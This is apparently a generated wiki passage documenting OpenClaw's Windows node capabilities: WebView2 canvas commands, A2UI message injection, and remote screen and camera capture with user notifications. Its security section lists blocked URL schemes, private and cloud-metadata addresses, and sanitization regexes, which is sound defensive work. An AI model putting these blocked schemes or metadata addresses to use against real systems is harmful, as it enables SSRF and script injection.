|-----------|------|---------|-------------|
| `format` | string | `"png"` | Image format: `"png"` or `"jpeg"` |
| `maxWidth` | number | `0` | Maximum width (0 = no limit, currently unused) |
| `quality` | number | `80` | JPEG quality 0-100 (currently unused) |

**Image Capture**

```mermaid
flowchart TB
    Request["canvas.snapshot request"]
    Cap["CanvasCapability"]
    Handler["SnapshotRequested handler"]
    NS["NodeService.OnCanvasSnapshot()"]
    CW["CanvasWindow.CaptureSnapshotAsync()"]
    WebView["CoreWebView2.CapturePreviewAsync()"]
    Stream["InMemoryRandomAccessStream"]
    Base64["Convert.ToBase64String()"]
    
    Request --> Cap
    Cap --> Handler
    Handler --> NS
    NS --> CW
    CW --> WebView
    WebView --> Stream
    Stream --> Base64
    Base64 --> Handler
    Handler --> Cap
    Cap --> Response["Success(base64)"]
    
    style CW fill:#e1ffe1
```

**Format Mapping**

| Input Format | CoreWebView2CapturePreviewImageFormat |
|--------------|---------------------------------------|
| `"jpeg"` or `"jpg"` | `CoreWebView2CapturePreviewImageFormat.Jpeg` |
| `"png"` or other | `CoreWebView2CapturePreviewImageFormat.Png` |

**Note on maxWidth and quality**: These parameters are parsed but currently not used by the WebView2 capture API. The captured image dimensions match the window size.

**Sources:**
- [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:469-477]()
- [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:558-592]()
- [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:275-300]()
- [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:278-301]()

---

## Adaptive UI (A2UI) Commands

The canvas capability includes special support for OpenClaw's Adaptive UI protocol, which allows the gateway to send structured UI messages to a compatible web application.

### A2UI Host URL Construction

The A2UI host URL is derived from the gateway URL:

```
ws://localhost:18789     →  http://localhost:18789/__openclaw__/a2ui/
wss://example.com:8080   →  https://example.com:8080/__openclaw__/a2ui/
```

**URL Construction Logic**

```mermaid
flowchart LR
    GatewayURL["Gateway URL<br/>(WebSocket)"]
    Parse["Parse URI"]
    Scheme{"WebSocket scheme"}
    
    GatewayURL --> Parse
    Parse --> Scheme
    Scheme -->|"wss://"| HTTPS["scheme = https"]
    Scheme -->|"ws://"| HTTP["scheme = http"]
    
    HTTPS --> Build["scheme://host:port/__openclaw__/a2ui/"]
    HTTP --> Build
    
    Build --> A2UIHostURL["A2UI Host URL"]
```

**Sources:**
- [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:311-323]()
- [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:379-388]()

---

### Command: canvas.a2ui.push

The `canvas.a2ui.push` command sends one or more A2UI messages to the canvas window. The canvas is automatically presented if not already visible, and the A2UI host page is loaded if necessary.

**Parameters**

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `jsonl` | string | Yes* | Newline-delimited JSON messages |
| `jsonlPath` | string | Yes* | Path to file containing JSONL messages |

*One of `jsonl` or `jsonlPath` is required.

**Message Delivery Flow**

```mermaid
sequenceDiagram
    participant Gateway
    participant CanvasCap as CanvasCapability
    participant NodeService
    participant CanvasWindow
    participant WebView2
    participant A2UIHost as A2UI Host Page
    
    Gateway->>CanvasCap: canvas.a2ui.push
    CanvasCap->>CanvasCap: Read jsonl or jsonlPath
    CanvasCap->>NodeService: A2UIPushRequested event
    
    NodeService->>NodeService: EnsureCanvasWindow()
    NodeService->>CanvasWindow: EnsureA2UIHostAsync(hostUrl)
    
    alt A2UI host not loaded
        CanvasWindow->>CanvasWindow: Navigate to A2UI host
        CanvasWindow->>WebView2: Navigate(hostUrl)
        WebView2->>A2UIHost: Load page
    end
    
    NodeService->>NodeService: Split jsonl by lines
    loop Each line
        NodeService->>CanvasWindow: SendA2UIMessageAsync(line)
        CanvasWindow->>CanvasWindow: BuildA2UIMessageScript(line)
        CanvasWindow->>WebView2: ExecuteScriptAsync(script)
        WebView2->>A2UIHost: window.__a2ui.receive(msg)
    end
    
    NodeService->>CanvasCap: Event complete
    CanvasCap->>Gateway: Success(sent: count)
```

**Message Injection Script**

The `BuildA2UIMessageScript()` method generates JavaScript that tries multiple A2UI API variants:

1. `window.__a2ui.receive(msg)` (primary)
2. `window.__a2ui.push(msg)` (fallback)
3. `window.__a2ui.ingest(msg)` (fallback)
4. `window.a2ui.*` (alternative namespace)
5. `window.A2UI.*` (alternative namespace)
6. `window.dispatchEvent(new MessageEvent(...))` (event-based)
7. `window.postMessage(msg, '*')` (postMessage-based)

**Sources:**
- [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:479-507]()
- [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:595-635]()
- [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:325-365]()
- [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:351-359]()
- [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:390-417]()

---

### Command: canvas.a2ui.reset

The `canvas.a2ui.reset` command clears the A2UI state by calling reset/clear methods on the A2UI host.

**Reset Script**

The `BuildA2UIResetScript()` method tries these reset methods in order:

1. `window.__a2ui.reset()`
2. `window.__a2ui.clear()`
3. `window.a2ui.reset()`
4. `window.a2ui.clear()`
5. `window.A2UI.reset()`
6. `window.A2UI.clear()`

Returns `"ok"` if any method is found, or `"no-handler"` if none exist.

**Sources:**
- [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:509-520]()
- [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:367-393]()
- [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:419-439]()

---

## Security Considerations

The canvas capability implements multiple security layers to prevent abuse of the WebView2 control.

### URL Validation

**Dangerous Schemes Blocked**

| Scheme | Risk |
|--------|------|
| `file://` | Local file access, information disclosure |
| `javascript:` | XSS, arbitrary code execution |
| `data:` | XSS via embedded scripts (except text/html, text/plain) |
| `vbscript:` | VBScript execution (legacy) |

**Private Network Blocking**

| Pattern | Examples | Risk |
|---------|----------|------|
| `localhost` | `http://localhost:8080` | SSRF, internal service access |
| `127.*` | `http://127.0.0.1` | Loopback access |
| `10.*` | `http://10.0.0.1` | Private network class A |
| `192.168.*` | `http://192.168.1.1` | Private network class C |
| `172.16-31.*` | `http://172.16.0.1` | Private network class B |
| `169.254.*` | `http://169.254.169.254` | Link-local, cloud metadata |
| `::1`, `0:0:0:0:0:0:0:1` | `http://[::1]:8080` | IPv6 loopback |

**Validation Regex**

```
^(file|javascript|data|vbscript):|
^https?://(localhost|127\.|10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|169\.254\.)|
^https?://\[(::1|0:0:0:0:0:0:0:1)\]
```

**Sources:**
- [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:24-63]()
- [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:203-209]()

---

### HTML Sanitization

The `LoadHtml()` method sanitizes input HTML to prevent embedded navigation that could bypass URL validation:

**Stripped Elements**

- `<iframe>` — embedded frames
- `<object>` — embedded objects (Flash, etc.)
- `<embed>` — embedded plugins
- `<applet>` — Java applets

**Sanitization Pattern**

```regex
<\s*(iframe|object|embed|applet)\b[^>]*>.*?<\s*/\s*\1\s*>  // Paired tags
<\s*(iframe|object|embed|applet)\b[^>]*/?\s*>              // Self-closing tags
```

Both patterns are replaced with `<!-- blocked -->`.

**Sources:**
- [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:224-257]()

---

### Script Execution Auditing

All JavaScript execution via `canvas.eval` is logged for security auditing:

```csharp
var truncatedScript = script.Length > 100 
    ? script.Substring(0, 100) + "..." 
    : script;
Debug.WriteLine($"[Canvas] Executing script: {truncatedScript}");
```

This provides a debug trail of all JavaScript executed in the canvas context.

**Sources:**
- [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:268-270]()

---

## WebView2 Configuration

The canvas window disables several WebView2 features for security and user experience:

**CoreWebView2 Settings**

| Setting | Value | Reason |
|---------|-------|--------|
| `IsScriptEnabled` | `true` | Required for canvas.eval functionality |
| `AreDefaultScriptDialogsEnabled` | `false` | Prevent `alert()`, `confirm()`, `prompt()` disruption |
| `IsStatusBarEnabled` | `false` | Cleaner UI, no link preview |
| `AreDevToolsEnabled` | `false` | Prevent F12 developer tools access |

**Sources:**
- [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:76-94]()

---

## Window Lifecycle

The canvas window is created on-demand and persists until explicitly closed.

**State Transitions**

```mermaid
stateDiagram-v2
    [*] --> Null: NodeService initialized
    Null --> Creating: canvas.present received
    Creating --> InitializingWebView: new CanvasWindow()
    InitializingWebView --> Ready: EnsureCoreWebView2Async() completes
    Ready --> Ready: canvas.navigate, canvas.eval, etc.
    Ready --> Null: canvas.hide or window closed
    Null --> Creating: canvas.present (new window)
    
    Ready --> Error: WebView2 initialization fails
    Error --> Null: User clicks Retry
```

**Window Reuse**

The `NodeService` maintains a reference to `_canvasWindow`:

- `canvas.present` reuses existing window if `!IsClosed`
- `canvas.hide` sets `_canvasWindow = null` after closing
- Closing the window manually (X button) sets `IsClosed = true`

**Sources:**
- [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:166-204]()
- [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:302-309]()
- [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:66-158]()
- [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs:190-193]()

---

## Error Handling

Canvas commands can fail at multiple points in the execution chain.

**Error Response Patterns**

| Scenario | Error Message | HTTP-like Status |
|----------|---------------|------------------|
| Missing `url` in `canvas.navigate` | `"url is required"` | 400 Bad Request |
| Missing `script` in `canvas.eval` | `"script is required"` | 400 Bad Request |
| Canvas not available for `canvas.eval` | `"Canvas not available"` | 503 Service Unavailable |
| Canvas not available for `canvas.snapshot` | `"Canvas not available"` | 503 Service Unavailable |
| URL blocked by security | `"URL blocked for security: ..."` | 403 Forbidden |
| Handler throws exception | `"Execution failed: <exception message>"` | 500 Internal Server Error |

**Exception Propagation**

```mermaid
flowchart TB
    CanvasWindow["CanvasWindow.EvalAsync()"]
    Exception["InvalidOperationException"]
    TaskCompletion["tcs.SetException(ex)"]
    AwaitTask["await tcs.Task"]
    CapabilityHandler["CanvasCapability handler"]
    CatchBlock["catch (Exception ex)"]
    ErrorResponse["Error(ex.Message)"]
    
    CanvasWindow -->|"throws"| Exception
    Exception --> TaskCompletion
    TaskCompletion --> AwaitTask
    AwaitTask -->|"propagates"| CapabilityHandler
    CapabilityHandler --> CatchBlock
    CatchBlock --> ErrorResponse
    
    style Exception fill:#ffe1e1
```

**Sources:**
- [src/OpenClaw.Shared/Capabilities/CanvasCapability.cs:85-148]()
- [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:541-555]()
- [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:583-592]()

---

## Testing

The canvas capability includes comprehensive unit tests that verify command parsing, event raising, and error handling without requiring actual UI components.

**Test Coverage**

| Test Category | Tests | Coverage |
|---------------|-------|----------|
| Command routing | `CanHandle_AllCanvasCommands` | All 7 commands recognized |
| `canvas.present` | 2 tests | Args parsing, defaults |
| `canvas.hide` | 1 test | Event raised |
| `canvas.navigate` | 2 tests | URL required, event raised |
| `canvas.eval` | 4 tests | Args, missing handler, exception handling |
| `canvas.snapshot` | 4 tests | Args parsing, missing handler, exception handling |
| `canvas.a2ui.push` | 3 tests | JSONL parsing, file reading, missing args |
| `canvas.a2ui.reset` | 1 test | Event raised |

**Mock Pattern**

Tests use event handlers instead of actual UI:

```csharp
var cap = new CanvasCapability(NullLogger.Instance);
string? evaledScript = null;
cap.EvalRequested += (script) => {
    evaledScript = script;
    return Task.FromResult("42");
};

var request = new NodeInvokeRequest {
    Command = "canvas.eval",
    Args = Parse("""{"javaScript":"document.title"}""")
};

var res = await cap.ExecuteAsync(request);
Assert.True(res.Ok);
Assert.Equal("document.title", evaledScript);
```

**Sources:**
- [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:329-636]()

---

## Integration Points

The canvas capability integrates with several other system components.

**Component Dependencies**

```mermaid
graph TB
    subgraph "OpenClaw.Shared"
        CanvasCap["CanvasCapability"]
        NodeClient["WindowsNodeClient"]
        Logger["IOpenClawLogger"]
    end
    
    subgraph "OpenClaw.Tray.WinUI"
        NodeSvc["NodeService"]
        CanvasWin["CanvasWindow"]
        DispatchQ["DispatcherQueue"]
    end
    
    subgraph "External"
        WebView2["Microsoft.Web.WebView2"]
        WinUIEx["WinUIEx (WindowEx)"]
    end
    
    NodeClient -->|"Dispatches commands"| CanvasCap
    CanvasCap -->|"Logs to"| Logger
    CanvasCap -->|"Fires events to"| NodeSvc
    NodeSvc -->|"Marshals via"| DispatchQ
    NodeSvc -->|"Manages"| CanvasWin
    CanvasWin -->|"Extends"| WinUIEx
    CanvasWin -->|"Embeds"| WebView2
    
    style CanvasCap fill:#e1f5ff
    style CanvasWin fill:#e1ffe1
```

**Thread Marshaling**

Canvas commands arrive on the WebSocket receive thread but must execute on the UI thread:

1. `WindowsNodeClient` receives command on background thread
2. Dispatches to `CanvasCapability.ExecuteAsync()` (background thread)
3. Capability fires event (background thread)
4. `NodeService` handler calls `_dispatcherQueue.TryEnqueue()` (background thread)
5. Lambda executes on UI thread, manipulates `CanvasWindow`

**Sources:**
- [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:166-204]()
- [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:248-273]()

---

# Page: Screen & Camera Capabilities

# Screen & Camera Capabilities

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [src/OpenClaw.Shared/Capabilities/SystemCapability.cs](src/OpenClaw.Shared/Capabilities/SystemCapability.cs)
- [src/OpenClaw.Shared/WindowsNodeClient.cs](src/OpenClaw.Shared/WindowsNodeClient.cs)
- [src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs](src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs)
- [src/OpenClaw.Tray.WinUI/Services/NodeService.cs](src/OpenClaw.Tray.WinUI/Services/NodeService.cs)
- [src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/CanvasWindow.xaml.cs)
- [tests/OpenClaw.Shared.Tests/CapabilityTests.cs](tests/OpenClaw.Shared.Tests/CapabilityTests.cs)
- [tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs](tests/OpenClaw.Shared.Tests/ExecApprovalPolicyTests.cs)

</details>



## Purpose and Scope

This document covers the **screen capture** and **camera snapshot** capabilities that enable remote control of Windows PC hardware when operating in Node Mode. These capabilities allow the OpenClaw Gateway to request screenshots and camera photos from the Windows node.

For information about Node Mode architecture and device pairing, see [4.1](#4.1). For system-level capabilities (notifications, command execution), see [4.3](#4.3). For canvas control capabilities, see [4.4](#4.4).

---

## Overview

The screen and camera capabilities are implemented as separate capability handlers registered with `WindowsNodeClient`. When the gateway sends a command like `screen.capture` or `camera.snap`, the node client dispatches it to the appropriate capability, which executes the hardware operation and returns the result as a base64-encoded image.

### Capability Registration

```mermaid
graph TB
    NodeService["NodeService<br/>(Services/NodeService.cs)"]
    NodeClient["WindowsNodeClient<br/>(_nodeClient)"]
    ScreenCap["ScreenCapability<br/>(_screenCapability)"]
    CameraCap["CameraCapability<br/>(_cameraCapability)"]
    ScreenSvc["ScreenCaptureService<br/>(_screenCaptureService)"]
    CameraSvc["CameraCaptureService<br/>(_cameraCaptureService)"]
    
    NodeService -->|"RegisterCapability()"| NodeClient
    NodeService -->|"creates"| ScreenCap
    NodeService -->|"creates"| CameraCap
    NodeService -->|"creates"| ScreenSvc
    NodeService -->|"creates"| CameraSvc
    
    ScreenCap -->|"ListRequested event"| ScreenSvc
    ScreenCap -->|"CaptureRequested event"| ScreenSvc
    CameraCap -->|"ListRequested event"| CameraSvc
    CameraCap -->|"SnapRequested event"| CameraSvc
    
    NodeClient -.->|"node.invoke.request"| ScreenCap
    NodeClient -.->|"node.invoke.request"| CameraCap
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:103-138]()

---

## Screen Capability

The `ScreenCapability` class implements two commands for screen operations: `screen.capture` (take screenshot) and `screen.list` (enumerate monitors).

### Command Summary

| Command | Purpose | Arguments | Returns |
|---------|---------|-----------|---------|
| `screen.capture` | Capture screenshot of a monitor | `format`, `maxWidth`, `quality`, `screenIndex` or `monitor` | Image data with dimensions |
| `screen.list` | List available monitors | None | Array of `ScreenInfo` objects |

### screen.capture Command

The `screen.capture` command takes a screenshot of a specified monitor (or the primary monitor by default) and returns it as a base64-encoded image embedded in a data URI.

#### Arguments

- **format** (string, optional): Image format - `"png"` or `"jpeg"`. Default: `"png"`
- **maxWidth** (int, optional): Maximum width in pixels. Image is scaled proportionally if larger. Default: no scaling
- **quality** (int, optional): JPEG quality (0-100). Only applies when `format="jpeg"`. Default: 80
- **screenIndex** or **monitor** (int, optional): Zero-based monitor index. Default: 0 (primary monitor)

#### Flow Diagram

```mermaid
sequenceDiagram
    participant Gateway as "OpenClaw Gateway"
    participant NodeClient as "WindowsNodeClient"
    participant ScreenCap as "ScreenCapability"
    participant Handler as "NodeService<br/>OnScreenCapture()"
    participant Service as "ScreenCaptureService"
    participant Notify as "Toast Notification"
    
    Gateway->>NodeClient: "event: node.invoke.request<br/>{command: 'screen.capture'}"
    NodeClient->>ScreenCap: "ExecuteAsync(request)"
    ScreenCap->>Handler: "CaptureRequested event<br/>(ScreenCaptureArgs)"
    
    Note over Handler: "Throttle notifications<br/>(max 1 per 10 sec)"
    Handler->>Notify: "Show '📸 Screen Captured'"
    
    Handler->>Service: "CaptureAsync(args)"
    Service-->>Handler: "ScreenCaptureResult<br/>{format, width, height, base64}"
    Handler-->>ScreenCap: "return result"
    
    ScreenCap->>ScreenCap: "Build response payload<br/>{image: data:image/...}"
    ScreenCap-->>NodeClient: "NodeInvokeResponse<br/>{ok: true, payload}"
    NodeClient->>Gateway: "node.invoke.result"
```

**Sources:** [src/OpenClaw.Shared/WindowsNodeClient.cs:309-415](), [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:397-428](), [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:638-788]()

#### Response Format

The response includes a `data:` URI that embeds the base64 image data:

```json
{
  "ok": true,
  "payload": {
    "image": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA...",
    "format": "png",
    "width": 1920,
    "height": 1080
  }
}
```

**Sources:** [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:742-763]()

### screen.list Command

The `screen.list` command enumerates all available monitors and returns their properties.

#### Response Format

```json
{
  "ok": true,
  "payload": {
    "screens": [
      {
        "index": 0,
        "name": "Main Display",
        "isPrimary": true,
        "width": 2560,
        "height": 1440
      },
      {
        "index": 1,
        "name": "Secondary Display",
        "isPrimary": false,
        "width": 1920,
        "height": 1080
      }
    ]
  }
}
```

**Sources:** [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:693-715]()

### Privacy Protection

Screen capture operations trigger a Windows toast notification to alert the user that their screen was captured. Notifications are throttled to a maximum of one per 10 seconds to avoid spam.

```csharp
// Throttle notifications to avoid spam
var now = DateTime.Now;
if ((now - _lastScreenCaptureNotification).TotalSeconds > 10)
{
    _lastScreenCaptureNotification = now;
    new ToastContentBuilder()
        .AddText("📸 Screen Captured")
        .AddText("OpenClaw agent captured your screen")
        .Show();
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:413-425]()

---

## Camera Capability

The `CameraCapability` class implements two commands for camera operations: `camera.snap` (capture photo) and `camera.list` (enumerate cameras).

### Command Summary

| Command | Purpose | Arguments | Returns |
|---------|---------|-----------|---------|
| `camera.snap` | Capture photo from camera | `deviceId`, `format`, `maxWidth`, `quality` | Image data with dimensions |
| `camera.list` | List available cameras | None | Array of `CameraInfo` objects |

### camera.snap Command

The `camera.snap` command captures a photo from the specified camera (or the default camera) and returns it as a base64-encoded image. This command employs a sophisticated **three-tier fallback mechanism** to maximize compatibility across different camera hardware and driver configurations.

#### Arguments

- **deviceId** (string, optional): Camera device ID from `camera.list`. Default: first available camera
- **format** (string, optional): Image format - `"png"` or `"jpeg"`. Default: `"jpeg"`
- **maxWidth** (int, optional): Maximum width in pixels. Image is scaled proportionally if larger. Default: 1280
- **quality** (int, optional): JPEG quality (0-100). Only applies when `format="jpeg"`. Default: 80

#### Three-Tier Fallback Mechanism

The camera capture implementation employs three progressively more compatible methods:

```mermaid
graph TB
    Start["camera.snap request"]
    Init["Initialize MediaCapture"]
    
    Method1["Tier 1: Photo Stream<br/>CapturePhotoToStreamAsync()"]
    Check1{"Photo stream<br/>supported?"}
    
    Method2["Tier 2: Frame Reader<br/>MediaFrameReader"]
    Check2{"Frame reader<br/>supported?"}
    
    Method3["Tier 3: Preview Frame<br/>GetPreviewFrameAsync()"]
    
    Encode["Encode & resize<br/>to target format"]
    Return["Return CameraSnapResult"]
    
    Start --> Init
    Init --> Method1
    Method1 --> Check1
    Check1 -->|"Success"| Encode
    Check1 -->|"MF_E_INVALIDMEDIATYPE<br/>0xC00D36B4"| Method2
    
    Method2 --> Check2
    Check2 -->|"Success"| Encode
    Check2 -->|"Exception"| Method3
    
    Method3 --> Encode
    Encode --> Return
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs:56-128]()

##### Tier 1: Photo Stream (Preferred)

Uses `MediaCapture.CapturePhotoToStreamAsync()` to capture a high-quality photo directly from the camera's photo stream. This is the most reliable method when supported.

```csharp
// Select best photo encoding format
var photoCandidates = SelectPhotoEncodings(capture, format, args.MaxWidth);
var encoding = await CaptureWithFallbackAsync(capture, photoCandidates);

// Capture directly from photo stream
await capture.CapturePhotoToStreamAsync(encoding, stream);
```

The implementation tries multiple photo encodings in order of preference (JPEG, PNG, MJPG) and falls back to the next tier if all fail with `MF_E_INVALIDMEDIATYPE` (0xC00D36B4).

**Sources:** [src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs:79-112](), [src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs:130-155]()

##### Tier 2: Frame Reader (Fallback)

If photo stream is unavailable, uses `MediaFrameReader` to capture frames from the camera's video feed. This method creates a frame reader, starts it, waits for a frame to arrive, and then extracts the `SoftwareBitmap`.

```csharp
// Create frame reader from color source
var frameReader = await capture.CreateFrameReaderAsync(source, selectedFormat.Subtype);

// Wait for frame (with 2-second timeout)
void OnFrameArrived(MediaFrameReader sender, MediaFrameArrivedEventArgs args)
{
    using var frame = sender.TryAcquireLatestFrame();
    var bitmap = frame?.VideoMediaFrame?.SoftwareBitmap;
    // ...capture bitmap
}

frameReader.FrameArrived += OnFrameArrived;
await frameReader.StartAsync();
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs:232-311]()

##### Tier 3: Preview Frame (Maximum Compatibility)

If frame reader fails, falls back to starting the camera preview and grabbing a single preview frame. This is the most compatible method but requires starting/stopping preview.

```csharp
// Start preview
await capture.StartPreviewAsync();

// Capture preview frame
using var frame = new VideoFrame(pixelFormat, width, height);
await capture.GetPreviewFrameAsync(frame);

// Stop preview
await capture.StopPreviewAsync();
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs:349-406]()

#### Encoding and Resizing

All three tiers converge to a common encoding pipeline that:

1. Converts the bitmap to BGRA8 format if needed
2. Scales the image to `maxWidth` if specified
3. Encodes to the requested format (PNG or JPEG)
4. Applies quality settings for JPEG

```csharp
private static async Task<CameraSnapResult> EncodeAsync(
    IRandomAccessStream input,
    string format,
    int maxWidth,
    int quality)
{
    var decoder = await BitmapDecoder.CreateAsync(input);
    
    // Calculate target dimensions
    if (maxWidth > 0 && width > maxWidth)
    {
        var scale = (double)maxWidth / width;
        targetWidth = (uint)maxWidth;
        targetHeight = (uint)Math.Max(1, Math.Round(height * scale));
    }
    
    // Encode with quality settings
    var encoder = await BitmapEncoder.CreateAsync(encoderId, output);
    if (format == "jpeg")
    {
        var qualityValue = Math.Clamp(quality / 100.0, 0.0, 1.0);
        await encoder.BitmapProperties.SetPropertiesAsync(props);
    }
    // ...
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs:453-523]()

#### Response Format

```json
{
  "ok": true,
  "payload": {
    "image": "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAA...",
    "format": "jpeg",
    "width": 1280,
    "height": 720
  }
}
```

**Sources:** [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:841-866]()

### camera.list Command

The `camera.list` command enumerates all available video capture devices using the Windows `DeviceInformation` API.

```csharp
public async Task<CameraInfo[]> ListCamerasAsync()
{
    var devices = await DeviceInformation.FindAllAsync(DeviceClass.VideoCapture);
    var result = new List<CameraInfo>();
    
    for (var i = 0; i < devices.Count; i++)
    {
        var device = devices[i];
        result.Add(new CameraInfo
        {
            DeviceId = device.Id,
            Name = device.Name,
            IsDefault = i == 0  // First device is considered default
        });
    }
    
    return result.ToArray();
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/CameraCaptureService.cs:37-54]()

#### Response Format

```json
{
  "ok": true,
  "payload": {
    "cameras": [
      {
        "deviceId": "\\\\?\\usb#vid_046d&pid_0825...",
        "name": "Logitech Webcam C270",
        "isDefault": true
      },
      {
        "deviceId": "\\\\?\\usb#vid_0c45&pid_6366...",
        "name": "Integrated Camera",
        "isDefault": false
      }
    ]
  }
}
```

**Sources:** [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:817-830]()

### Privacy Protection and Permissions

#### Camera Access Permissions

Camera access requires the **webcam** capability to be declared in the MSIX package manifest. If camera access is denied (e.g., user disabled camera access in Windows Privacy settings), the implementation catches `UnauthorizedAccessException` and displays a helpful toast notification:

```csharp
try
{
    return await _cameraCaptureService.SnapAsync(args);
}
catch (UnauthorizedAccessException ex)
{
    new ToastContentBuilder()
        .AddText("📷 Camera access blocked")
        .AddText("Enable camera access in Windows Privacy settings for OpenClaw Tray")
        .Show();
    
    throw new InvalidOperationException(
        "Camera access blocked. Enable camera access for desktop apps in Windows Privacy settings.",
        ex);
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:444-469]()

#### MSIX Capability Declaration

The MSIX package must declare camera permissions in the manifest:

```xml
<Capability Name="webcam" />
```

This triggers Windows to show a consent prompt when the application first attempts to access the camera, allowing the user to grant or deny permission.

**Sources:** Referenced in [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:75]()

---

## Capability Implementation Architecture

Both screen and camera capabilities follow the same architectural pattern:

```mermaid
graph TB
    subgraph "Shared Library (OpenClaw.Shared)"
        CapBase["NodeCapabilityBase<br/>(abstract base)"]
        ScreenCap["ScreenCapability"]
        CameraCap["CameraCapability"]
        
        CapBase -.->|"extends"| ScreenCap
        CapBase -.->|"extends"| CameraCap
    end
    
    subgraph "Capability Interface"
        INodeCap["INodeCapability"]
        Category["Category property<br/>'screen' or 'camera'"]
        Commands["Commands property<br/>['screen.capture', 'screen.list']"]
        Execute["ExecuteAsync(request)<br/>returns NodeInvokeResponse"]
    end
    
    subgraph "Event-Based Handlers"
        ScreenCapHandler["ScreenCapability<br/>CaptureRequested event"]
        CameraSnapHandler["CameraCapability<br/>SnapRequested event"]
        
        ScreenCapHandler -->|"fires event"| ServiceLayer
        CameraSnapHandler -->|"fires event"| ServiceLayer
    end
    
    subgraph "Service Layer (WinUI App)"
        ServiceLayer["NodeService<br/>OnScreenCapture()<br/>OnCameraSnap()"]
        ScreenSvc["ScreenCaptureService"]
        CameraSvc["CameraCaptureService"]
        
        ServiceLayer --> ScreenSvc
        ServiceLayer --> CameraSvc
    end
    
    CapBase -.->|"implements"| INodeCap
    ScreenCap --> Category
    ScreenCap --> Commands
    ScreenCap --> Execute
    
    Execute -->|"raises event"| ScreenCapHandler
    Execute -->|"raises event"| CameraSnapHandler
```

**Sources:** [src/OpenClaw.Shared/Capabilities/](), [src/OpenClaw.Tray.WinUI/Services/NodeService.cs:125-136]()

### Capability Base Class

The `NodeCapabilityBase` abstract class provides common functionality for all capabilities:

- **Success/Error helpers**: `Success(payload)`, `Error(message)` methods for building responses
- **Argument parsing helpers**: `GetStringArg()`, `GetIntArg()`, `GetBoolArg()` for extracting typed values from JSON arguments
- **Logging**: All capabilities receive an `IOpenClawLogger` instance

**Sources:** [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:15-26]() (base pattern), [src/OpenClaw.Shared/Capabilities/SystemCapability.cs:36-37]() (logger usage)

### Command Dispatch Flow

```mermaid
sequenceDiagram
    participant Gateway as "Gateway"
    participant NodeClient as "WindowsNodeClient"
    participant Capability as "ScreenCapability<br/>or CameraCapability"
    participant Service as "ScreenCaptureService<br/>or CameraCaptureService"
    
    Gateway->>NodeClient: "node.invoke.request"
    Note over NodeClient: "Find capability<br/>by command prefix"
    
    NodeClient->>NodeClient: "capability = _capabilities<br/>.FirstOrDefault(c => c.CanHandle(command))"
    NodeClient->>Capability: "ExecuteAsync(request)"
    
    Note over Capability: "Parse args,<br/>validate format"
    
    Capability->>Capability: "Raise CaptureRequested<br/>or SnapRequested event"
    Capability->>Service: "Event handler invoked"
    
    Service->>Service: "Hardware operation<br/>(screenshot or camera)"
    Service-->>Capability: "Result (base64 image)"
    
    Capability->>Capability: "Build payload<br/>{image, format, width, height}"
    Capability-->>NodeClient: "NodeInvokeResponse<br/>{ok: true, payload}"
    
    NodeClient->>Gateway: "node.invoke.result"
```

**Sources:** [src/OpenClaw.Shared/WindowsNodeClient.cs:389-414](), [tests/OpenClaw.Shared.Tests/CapabilityTests.cs:667-691]()

---

## Testing

Both capabilities have comprehensive unit tests that validate:

1. **Command recognition**: `CanHandle()` correctly identifies screen/camera commands
